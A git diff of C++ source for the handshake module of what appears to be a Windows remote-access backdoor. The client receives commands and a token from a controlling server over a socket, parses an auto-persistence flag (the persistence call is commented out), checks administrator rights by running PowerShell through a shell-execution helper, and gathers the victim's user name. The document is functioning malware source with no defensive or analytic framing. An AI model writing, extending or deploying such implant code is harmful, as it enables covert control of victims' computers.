@@ -30,20 +30,45 @@ void HandShake::setSock(int sock)
 {
     a_sock = sock;
 }
+void HandShake::sendUltraSafe(string data)
+{
+    int len_send=0;
+    string confirmation;
+    len_send = send(a_sock, data.c_str(), strlen(data.c_str()), 0);
+    if(len_send == SOCKET_ERROR)
+    {
+        //error
+        cout << "error " << endl;
 
+    }
+    else
+    {
+        confirmation = recvUltraSafe();
+        if(confirmation == "confirmation")
+        {
+            cout << "confirmation ok !" << endl;
+        }
+        else
+        {
+            cout << "ERROR in confirmation" << endl;
+        }
+        
+    }
+    
+}
 string HandShake::recvUltraSafe()
 {
     //https://forum.hardware.fr/hfr/Programmation/C-2/resolu-timeout-existe-sujet_34270_1.htm
 
     char buffer[BUFFER_LEN];
 
-    cout << strlen(buffer) << endl;
-    cout <<  sizeof(buffer) << endl;
+   // cout << strlen(buffer) << endl;
+   // cout <<  sizeof(buffer) << endl;
     
     if(strlen(buffer) > 0)
     {
         //clean buffer
-        cout << "Clean " << endl;
+       // cout << "Clean " << endl;
         memset(buffer, 0, sizeof(buffer));
     }
     
@@ -57,6 +82,7 @@ string HandShake::recvUltraSafe()
     if(selectSock > 0)
     {
         //while (true)
+        //Sleep(SLEEP_RECV);
         int len_recv= recv(a_sock, buffer, sizeof(buffer), 0);
         if(len_recv == SOCKET_ERROR)
         {
@@ -78,7 +104,7 @@ string HandShake::recvUltraSafe()
     else if (selectSock == 0)
     {
         //Timeout
-        cout << "TIMEOUT recv !!" << endl;
+        //cout << "TIMEOUT recv !!" << endl;
         //Stop
         return (string) "TIMEOUT";
     }
@@ -148,58 +174,78 @@ int HandShake::startHandShake()
     cout << "[+] second part of handshake  goooo !!" << endl;
     //Gets all the parameters that the server sends during the handshake.
     string result;
+    int i_recv = 0;
     char buffer[BUFFER_LEN];
     bool auto_persi = false; //default
+    int index=0;
+    string token;
 
     while(true)
-    {
-        /*
-        len_recv =recv(a_sock,buffer,sizeof(buffer),0);
-        if(len_recv == SOCKET_ERROR)
+    {   
+        if(i_recv > 14)
         {
-            cout << "Error in startHandShake" << endl;
+            //avoid errors if the function runs in a loop
+            cout << "Must itterator !" << endl;
             break;
         }
-        result.append(buffer,len_recv);    
-        cout << "Len recv: " << len_recv << endl;
-        cout << "result: " << result << endl;
-        cout << "Len result: " << result.length() << endl;
-        */
 
         string result = recvUltraSafe();
-        if(result == "\r\n")
+        
+        index =  result.find("|");
+ 
+        if(index != string::npos)
+        {
+            cout <<"--->"<< result << endl;
+            cout << "LEN -->" << result.length() << endl;
+            cout << result.substr(index+2, result.length()) << endl;
+            cout << result.substr(0, index-1)  << "<-----" <<endl;
+            cout << "INDEX FIND: " << index << endl;
+            
+            if(result.substr(0,30) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
+            {
+                //All informations in MOD_HANDSHAKE_AUTO_PERSISTENCE
+                cout << "MOD_HANDSHAKE_AUTO_PERSISTENCE ok" << endl;
+                if(result.substr(33,result.length())== "True")
+                {
+                cout << "IS: " << result.substr(33,result.length()) << endl;
+                //auto_persistence = true;
+                // Persistence(true,path_prog).defaultPersi();
+                }
+                
+                else if (result.substr(33,result.length())== "False")
+                {
+                    cout << "IS: " << result.substr(33,result.length()) << endl;
+                    //auto_persistence = false;
+                }
+                else
+                {
+                    cout << "Error  in recv MOD_HANDSHAKE_AUTO_PERSISTENCE" << endl;
+                }
+            }    
+            else if((result.substr(0, index-1)) == "MOD_HANDSHAKE_TOKEN") 
+            {
+                
+                    token = result.substr(index+2, result.length());
+                    cout <<"FINAL TOKEN: " << token << endl;
+            } 
+            
+            else
+            {
+                //Eroor
+                ;
+            }
+            result.erase();        
+        }
+        else if(result == "\r\n")
         {
             cout << "end handshake" << endl;
             break;
         }
-        else if(result.substr(0,30) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
+        else // Not index find 
         {
-            //All informations in MOD_HANDSHAKE_AUTO_PERSISTENCE
-            cout << "MOD_HANDSHAKE_AUTO_PERSISTENCE ok" << endl;
-            if(result.substr(33,result.length())== "True")
-            {
-               cout << "IS: " << result.substr(33,result.length()) << endl;
-               //auto_persistence = true;
-              // Persistence(true,path_prog).defaultPersi();
-            }
-            
-            else if (result.substr(33,result.length())== "False")
-            {
-                cout << "IS: " << result.substr(33,result.length()) << endl;
-                //auto_persistence = false;
-            }
-            
-            else
-            {
-                cout << "Error  in recv MOD_HANDSHAKE_AUTO_PERSISTENCE" << endl;
-            }
+            cout << "NOT FIND INDEX" << endl;
         }
-        else
-        {
-            //Eroor
-            ;
-        }
-        result.erase();        
+        ++i_recv;
     }
     
     return 0;
@@ -207,18 +253,17 @@ int HandShake::startHandShake()
 
 bool HandShake::setIsAdmin()
 {
-    cout << "SET ADMIN "<<endl;
     string result;
     cout << "call getamdin" << endl;
     ModShell().exec("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"",result);
     if(result.substr(0,4) == "True") //remove ruturn line.
     {
-        cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
+        //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
         return true;
     }
     else
     {
-        cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
+        //2 cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
         return false;
     }
 }
@@ -236,7 +281,7 @@ string HandShake::setNameUser()
     else
     {
         string result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
-        cout <<"name user: " <<result << endl;
+        //2 cout <<"name user: " <<result << endl;
         return result.substr(0,result.length()-1);    
     }
     
